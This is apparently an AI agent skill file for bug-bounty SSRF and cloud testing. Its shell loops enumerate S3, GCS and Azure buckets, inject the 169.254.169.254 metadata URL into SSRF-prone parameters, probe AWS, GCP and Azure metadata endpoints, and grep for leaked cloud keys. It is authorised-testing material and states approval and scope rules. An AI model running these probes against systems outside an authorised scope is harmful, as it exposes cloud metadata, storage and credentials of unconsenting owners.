---
name: bug-bounty-ssrf-cloud
description: Use for SSRF, cloud metadata exposure, object storage misconfiguration, cloud service discovery, callback validation, and cloud-adjacent bug bounty testing.
---

# Bug Bounty SSRF And Cloud

Use this skill when inputs fetch URLs, webhooks, imports, image processors, PDF generators, integrations, cloud storage links, or metadata-like resources.

## Safety Rules

- Ask for approval before out-of-band callbacks, internal host probing, cloud metadata probes, or scanner templates.
- Use canary endpoints and self-controlled infrastructure when permitted.
- Do not retrieve secrets, credentials, IAM role tokens, customer files, or private objects.
- Prove reachability and impact with metadata-safe evidence.

## SSRF Triage

1. Identify URL-fetching parameters and webhook destinations.
2. Test allowed protocols and redirect behavior.
3. Use a benign external canary callback if allowed.
4. Check whether response content, status, DNS lookup, or timing indicates server-side fetch.
5. Escalate only within ROE.

## Cloud Storage Enumeration

Run this yourself against the merged subdomain list — read the output before deciding whether to widen the region list or the naming permutations, rather than firing every combination blind:

```bash
# S3 bucket probing across common regions
while IFS= read -r SUB; do
    BUCKET=$(echo "$SUB" | cut -d. -f1)
    for REGION in us-east-1 us-west-2 eu-west-1 ap-southeast-1; do
        curl -sI "https://${BUCKET}.s3.${REGION}.amazonaws.com/" | \
            grep -qi "listbucket\|AllAccess" && \
            echo "OPEN: $BUCKET ($REGION)" >> "$BB_ROOT/cloud/open-buckets.txt"
    done
done < "$BB_ROOT/passive/subdomains-merged.txt"

# Brand-name permutation sweep across AWS S3 / GCP GCS / Azure Blob --
# unauthenticated existence + public-listing check only, no credentials:
for suf in "" "-prod" "-dev" "-staging" "-backup" "-data" "-assets" "-public"; do
    bucket="${keyword}${suf}"
    for url in \
        "https://${bucket}.s3.amazonaws.com/" \
        "https://storage.googleapis.com/${bucket}/" \
        "https://${bucket}.blob.core.windows.net/?comp=list"; do
        code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 "$url")
        [ "$code" = "200" ] && echo "OPEN: $bucket -> $url" >> "$BB_ROOT/cloud/open-buckets.txt"
        [ "$code" = "403" ] && echo "EXISTS (not listable): $bucket -> $url" >> "$BB_ROOT/cloud/open-buckets.txt"
    done
done
```

## Manual Cloud Checks

Basic response comparison:

```bash
BB_ROOT="${BUGBOUNTY_ROOT:-$HOME/bugbounty/$slug}"
mkdir -p "$BB_ROOT"/{vulns,logs,tmp}
ts="$(date +%Y%m%d-%H%M%S)"
curl -sk -D "$BB_ROOT/vulns/ssrf-control-headers-$ts.txt" -o "$BB_ROOT/vulns/ssrf-control-body-$ts.txt" \
  "https://example.com/fetch?url=https://example.com/robots.txt" \
  > "$BB_ROOT/logs/ssrf-control-$ts.out" 2> "$BB_ROOT/logs/ssrf-control-$ts.err"
curl -sk -D "$BB_ROOT/vulns/ssrf-test-headers-$ts.txt" -o "$BB_ROOT/vulns/ssrf-test-body-$ts.txt" \
  "https://example.com/fetch?url=https://YOUR-CANARY.example/ping" \
  > "$BB_ROOT/logs/ssrf-test-$ts.out" 2> "$BB_ROOT/logs/ssrf-test-$ts.err"
wc -c "$BB_ROOT"/vulns/ssrf-*-body-"$ts".txt
```

## Manual Response Analysis

```bash
BB_ROOT="${BUGBOUNTY_ROOT:-$HOME/bugbounty/$slug}"
mkdir -p "$BB_ROOT"/{cloud,vulns,logs,tmp}
ts="$(date +%Y%m%d-%H%M%S)"

# Cloud storage keyword search
rg -n "s3\.amazonaws\.com|storage.googleapis.com|blob.core.windows.net|cloudfront.net|amazonaws.com|googleapis.com|azure" "$BB_ROOT" | sed -n '1,120p'

# Manual S3 bucket check
for BUCKET in target target-assets target-static target-cdn; do
    for REGION in us-east-1 us-west-2 eu-west-1; do
        HTTP_CODE=$(curl -sI "https://${BUCKET}.s3.${REGION}.amazonaws.com/" | head -1 | awk '{print $2}')
        [ "$HTTP_CODE" = "200" ] && echo "OPEN: $BUCKET ($REGION)"
        [ "$HTTP_CODE" = "403" ] && echo "EXISTS (private): $BUCKET ($REGION)"
    done
done
```

## SSRF-Prone Parameter Detection

The orchestrator automatically extracts SSRF-prone URLs:

```bash
# Auto-extracted by orchestrator Phase 1
SSRF_PARAMS="url|uri|path|dest|redirect|return|dst|out|view|dir|show|file|document|folder|load|read|data|page|host|port|domain|site|target|source|callback|next|prev|continue|location"
grep -oP "\?(.*=.*)?($SSRF_PARAMS)=" "$BB_ROOT/recon/passive/waybackurls.txt" | \
    sort -u > "$BB_ROOT/cloud/ssrf-prone-urls.txt"
```

Manual testing on extracted URLs:

```bash
# Test with metadata endpoint (only if ROE allows)
while read -r URL; do
    TEST_URL=$(echo "$URL" | sed 's/=.*/=http:\/\/169.254.169.254\/latest\/meta-data\//')
    RESP=$(curl -sL --connect-timeout 5 "$TEST_URL" 2>/dev/null)
    [ -n "$RESP" ] && echo "SSRF_CONFIRMED: $URL" >> "$BB_ROOT/vulns/critical/ssrf-confirmed.txt"
done < "$BB_ROOT/cloud/ssrf-prone-urls.txt"
```

## Cloud Metadata Probing (Requires Approval)

AWS metadata v1 (no token):
```bash
curl -s --connect-timeout 5 "http://169.254.169.254/latest/meta-data/"
curl -s --connect-timeout 5 "http://169.254.169.254/latest/user-data/"
```

GCP metadata (requires header):
```bash
curl -s --connect-timeout 5 "http://metadata.google.internal/computeMetadata/v1/" \
    -H "Metadata-Flavor: Google"
```

Azure metadata:
```bash
curl -s --connect-timeout 5 "http://169.254.169.254/metadata/instance" \
    -H "Metadata: true"
```

**Do not retrieve secrets, credentials, IAM role tokens, customer files, or private objects.**
**Prove reachability and impact with metadata-safe evidence only.**

## Tool Map

- **Discovery:** `katana`, `gau`, `waybackurls`, `hakrawler`, `paramspider`, `arjun`, `rg`, `unfurl`
- **SSRF triage:** `curl`, Burp Suite, `nuclei` SSRF templates (when allowed), DNS/callback canaries, `gopherus` for advanced SSRF
- **Cloud enumeration:** manual `curl` probes (see Cloud Storage Enumeration above), `s3scanner`, `awscli` (public checks only)
- **Bucket probing:** Custom scripts for S3/Azure/GCS enumeration across regions
- **Service clues:** `httpx`, `whatweb`, JS analysis, OpenAPI/Swagger review, cloud keyword detection

## Cloud Credential Detection

The orchestrator automatically scans for exposed cloud credentials:

```bash
# Auto-run in Phase 5
grep -oiP '(AKIA[0-9A-Z]{16}|AWS4-HMAC-SHA256|aws_access_key|aws_secret_key|AZURE_CLIENT|api_key=|api_secret=|password=|secret=)' \
    "$BB_ROOT/recon/passive/waybackurls.txt" | sort -u > "$BB_ROOT/cloud/cloud-creds-found.txt"
```

If credentials found: **IMMEDIATE P0 ALERT** - Do not use, just report the exposure.

## Metadata Boundaries

Cloud metadata endpoints are sensitive. Do not request credentials or tokens. If ROE allows metadata testing, use harmless metadata paths or canary-style proof first, then stop and report the risk.

## SSRF Validation Checklist

- [ ] Identified URL-fetching parameters
- [ ] Tested protocol restrictions (http/https/gopher/dict/file)
- [ ] Checked redirect following behavior
- [ ] Verified server-side fetch (not client-side)
- [ ] Tested with canary callback (if allowed)
- [ ] Probed cloud metadata (only with approval)
- [ ] Documented exact request/response
- [ ] Estimated impact (internal network access? cloud IAM?)

## Output Convention

All commands must save output to organized paths:

```bash
ts="$(date +%Y%m%d-%H%M%S)"
BB_ROOT="${BUGBOUNTY_ROOT:-$HOME/bugbounty/$slug}"
# stdout -> $BB_ROOT/<phase>/<tool>-$ts.txt
# stderr -> $BB_ROOT/logs/<tool>-$ts.err
```

Never dump raw tool output into chat context. Save to files, then read targeted excerpts.
